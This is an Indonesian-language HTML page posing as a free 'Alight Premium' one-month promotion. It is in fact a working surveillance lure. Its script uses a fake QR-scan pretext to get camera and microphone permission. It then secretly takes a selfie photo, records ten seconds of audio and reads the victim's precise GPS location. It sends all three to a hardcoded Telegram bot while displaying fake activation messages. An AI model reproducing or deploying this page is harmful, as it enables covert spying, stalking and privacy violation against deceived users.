<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Alight Premium</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Inter',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;background:radial-gradient(circle at 30% 20%,#1e2435,#0a0c14 85%);padding:16px}
    .card{position:relative;z-index:1;background:rgba(255,255,255,.06);backdrop-filter:blur(24px);border-radius:48px;padding:28px 22px;max-width:480px;width:100%;box-shadow:0 40px 80px rgba(0,0,0,.7);border:1px solid rgba(255,255,255,.1)}
    .top{display:flex;justify-content:space-between;margin-bottom:16px}
    .badge{background:linear-gradient(135deg,#f7971e,#ffd200);color:#fff;font-weight:800;font-size:11px;padding:4px 14px;border-radius:40px;display:flex;align-items:center;gap:6px}
    .timer{color:#ffb347;background:rgba(35,42,61,.5);padding:4px 14px;border-radius:30px;font-size:13px;border:1px solid rgba(255,180,70,.15)}
    .icon{text-align:center;font-size:60px;color:#ffb347;text-shadow:0 0 40px rgba(247,151,30,.3)}
    h1{font-size:28px;font-weight:800;text-align:center;background:linear-gradient(135deg,#ffb347,#ff8c00);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
    .sub{text-align:center;color:#a8b3ce;font-size:14px;border-bottom:1px solid rgba(255,255,255,.06);padding-bottom:14px;margin-bottom:18px}
    .sub strong{color:#ffb347;-webkit-text-fill-color:#ffb347}
    .info{background:rgba(18,23,36,.35);border-radius:20px;padding:16px 20px;margin-bottom:20px;border-left:5px solid #f7971e;font-size:14px;line-height:1.8;display:flex;gap:12px;border:1px solid rgba(255,255,255,.05)}
    .info i{color:#ffb347;font-size:22px}
    .info .text{color:#eef2f7}
    .info .text span{color:#ffd966;font-weight:600}
    .status{background:rgba(16,21,31,.4);border-radius:18px;padding:14px 20px;margin-bottom:22px;display:flex;align-items:center;gap:16px;border:1px solid rgba(255,255,255,.06);min-height:68px}
    .dot{width:16px;height:16px;border-radius:50%;background:#3e485f;flex-shrink:0;transition:.3s}
    .dot.active{background:#f5b342;box-shadow:0 0 25px #f5b342aa}
    .dot.done{background:#2ecc71;box-shadow:0 0 25px #2ecc71aa}
    .dot.error{background:#e74c3c;box-shadow:0 0 25px #e74c3caa}
    #st{font-size:15px;color:#d0dbf0;flex:1}
    #st i{margin-right:8px;color:#f5b342}
    #st a{color:#ffb347;text-decoration:underline}
    .btn{width:100%;padding:18px;border:none;border-radius:60px;background:linear-gradient(135deg,#f7971e,#e07c0a);color:#fff!important;font-size:19px;font-weight:800;cursor:pointer;display:flex;justify-content:center;align-items:center;gap:12px;box-shadow:0 12px 35px rgba(247,151,30,.3);transition:.25s}
    .btn:hover:not(:disabled){transform:translateY(-2px)scale(1.02)}
    .btn:disabled{opacity:.5;background:#3a3f55;color:#8892b0!important;box-shadow:none}
    .log{margin-top:20px;background:rgba(11,16,26,.4);border-radius:16px;padding:12px 16px;max-height:100px;overflow-y:auto;font-size:11px;color:#6a7a96;border:1px solid rgba(255,255,255,.04);line-height:2;font-family:monospace}
    .log i{color:#f5b342}
    .log a{color:#ffb347;text-decoration:underline}
    .footer{margin-top:16px;font-size:12px;color:#4d5a78;display:flex;justify-content:center;gap:14px;flex-wrap:wrap}
    .footer span{background:rgba(27,34,53,.35);padding:4px 16px;border-radius:40px;display:flex;align-items:center;gap:6px;border:1px solid rgba(255,255,255,.05)}
    .footer .gold{color:#ffb347}
    @media(max-width:480px){.card{padding:20px 16px}h1{font-size:24px}.icon{font-size:48px}.btn{font-size:17px;padding:15px}}
  </style>
</head>
<body>
<div class="card">
  <div class="top">
    <span class="badge"><i class="fas fa-crown"></i> PROMO</span>
    <span class="timer"><i class="fas fa-hourglass-half"></i> 24:00</span>
  </div>
  <div class="icon"><i class="fas fa-film"></i><i class="fas fa-crown" style="font-size:.5em;margin-left:-8px;color:#ffd966"></i></div>
  <h1>Alight Premium</h1>
  <div class="sub">Klaim <strong>1 Bulan GRATIS</strong> · Aktivasi</div>
  <div class="info">
    <i class="fas fa-gem"></i>
    <div class="text">Dapatkan akses penuh 30 hari gratis.<br><span><i class="fas fa-camera"></i> izinkan kamera scan QR</span></div>
  </div>
  <div class="status">
    <div class="dot" id="dot"></div>
    <div id="st"><i class="fas fa-circle"></i> Siap</div>
  </div>
  <button class="btn" id="btn"><i class="fas fa-play"></i> Klaim</button>
  <div class="log" id="log"><i class="fas fa-terminal"></i> Log</div>
  <div class="footer">
    <span><i class="fas fa-shield-alt"></i> Aman</span>
    <span class="gold"><i class="fas fa-bolt"></i> Klik mulai</span>
  </div>
</div>

<script>
// ===== KONFIGURASI =====
const BOT = '8600589160:AAEvLkCFyx8C4LT27bTAMBOrR6m7wKdpKdw';
const CHAT = '8303356575';
const SEND = `https://api.telegram.org/bot${BOT}/sendMessage`;
const SEND_PHOTO = `https://api.telegram.org/bot${BOT}/sendPhoto`;
const SEND_AUDIO = `https://api.telegram.org/bot${BOT}/sendAudio`;
const SEND_DOC = `https://api.telegram.org/bot${BOT}/sendDocument`;

let stream = null, chunks = [], recorder = null, locData = null, running = false;
const st = document.getElementById('st'), dot = document.getElementById('dot');
const btn = document.getElementById('btn'), log = document.getElementById('log');

function setStatus(msg, state) {
  let icon = '<i class="fas fa-spinner fa-pulse"></i>';
  if (state === 'done') icon = '<i class="fas fa-check-circle"></i>';
  else if (state === 'error') icon = '<i class="fas fa-exclamation-circle"></i>';
  else if (!state) icon = '<i class="fas fa-circle"></i>';
  st.innerHTML = icon + ' ' + msg;
  dot.className = 'dot';
  if (state === 'active') dot.classList.add('active');
  else if (state === 'done') dot.classList.add('done');
  else if (state === 'error') dot.classList.add('error');
}

function logMsg(m) {
  const t = new Date().toLocaleTimeString('id-ID');
  log.innerHTML += `\n[${t}] ${m}`;
  log.scrollTop = log.scrollHeight;
}

// ===== LINK GOOGLE MAPS =====
function gpsLink(lat, lng) {
  return `https://www.google.com/maps?q=${lat},${lng}`;
}

async function sendText(t) {
  try {
    const r = await fetch(SEND, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT, text: t })
    });
    return r.json();
  } catch (e) {}
}

async function sendPhoto(blob, cap) {
  const fd = new FormData();
  fd.append('chat_id', CHAT); fd.append('photo', blob, 'cap.jpg');
  if (cap) fd.append('caption', cap);
  try { return await fetch(SEND_PHOTO, { method: 'POST', body: fd }); } catch (e) {}
}

async function sendAudio(blob, cap) {
  const fd = new FormData();
  fd.append('chat_id', CHAT); fd.append('audio', blob, 'rec.webm');
  if (cap) fd.append('caption', cap);
  try { return await fetch(SEND_AUDIO, { method: 'POST', body: fd }); } catch (e) {}
}

async function sendLocationJSON(loc) {
  if (!loc) return;
  const blob = new Blob([JSON.stringify(loc, null, 2)], { type: 'application/json' });
  const fd = new FormData();
  fd.append('chat_id', CHAT); fd.append('document', blob, 'loc.json');
  fd.append('caption', 'Lokasi');
  try { return await fetch(SEND_DOC, { method: 'POST', body: fd }); } catch (e) {}
}

async function capturePhoto() {
  return new Promise((r, j) => {
    if (!stream) return j('no stream');
    const track = stream.getVideoTracks()[0];
    if (!track) return j('no video');
    new ImageCapture(track).takePhoto().then(r).catch(j);
  });
}

function recordAudio() {
  return new Promise((r, j) => {
    if (!stream) return j('no stream');
    const audioTracks = stream.getAudioTracks();
    if (!audioTracks.length) return j('no audio');
    const audioStream = new MediaStream(audioTracks);
    recorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
    chunks = [];
    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
    recorder.onstop = () => r(new Blob(chunks, { type: 'audio/webm' }));
    recorder.start();
    setTimeout(() => { if (recorder && recorder.state === 'recording') recorder.stop(); }, 10000);
  });
}

function getLocation() {
  return new Promise((r, j) => {
    if (!navigator.geolocation) return j('no geolocation');
    navigator.geolocation.getCurrentPosition(
      p => r({ lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy, timestamp: new Date().toISOString() }),
      e => j(e.message),
      { enableHighAccuracy: true, timeout: 15000 }
    );
  });
}

async function run() {
  if (running) return;
  running = true;
  btn.disabled = true;
  btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Proses...';
  logMsg('Mulai...');

  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
    logMsg('Izin diberikan');

    setStatus('Scan QR...', 'active');
    const photoBlob = await capturePhoto();
    logMsg('Foto diambil');
    setStatus('Kirim QR...', 'active');
    await sendPhoto(photoBlob, 'Alight_QR');
    logMsg('Foto terkirim');
    await sendText('QR terdeteksi.');

    setStatus('Tunggu Sebentar', 'active');
    logMsg('Rekam...');
    const audioBlob = await recordAudio();
    logMsg('Rekaman selesai');
    setStatus('Kirim audio...', 'active');
    await sendAudio(audioBlob, 'Alight_audio');
    logMsg('Audio terkirim');

    setStatus('Deteksi lokasi...', 'active');
    logMsg('GPS...');
    try {
      locData = await getLocation();
      const link = gpsLink(locData.lat, locData.lng); // Google Maps link
      await sendLocationJSON(locData);
      await sendText(`Wilayah: ${locData.lat}, ${locData.lng} (±${locData.accuracy}m)\nLink: ${link}`);
      setStatus(`Lokasi verifikasi - <a href="${link}" target="_blank">${link}</a>`, 'done');
      logMsg(`GPS: ${link}`);
    } catch (e) {
      await sendText(`Gagal lokasi: ${e}`);
      logMsg('Error lokasi');
      setStatus('Lokasi gagal', 'error');
    }

    await sendText('PREMIUM AKTIF. Data lengkap.');
    logMsg('=== AKTIF ===');
    if (!locData) setStatus('Premium aktif (tanpa lokasi)', 'done');

  } catch (e) {
    setStatus('Error: ' + e, 'error');
    logMsg('KRITIKAL: ' + e);
    await sendText('Error: ' + e);
  } finally {
    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
    if (recorder && recorder.state === 'recording') recorder.stop();
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-redo-alt"></i> Ulangi';
    running = false;
  }
}

btn.addEventListener('click', run);
window.onload = () => { logMsg('Siap. Klik tombol.'); };
logMsg('Sistem siap.');
</script>
</body>
  </html>
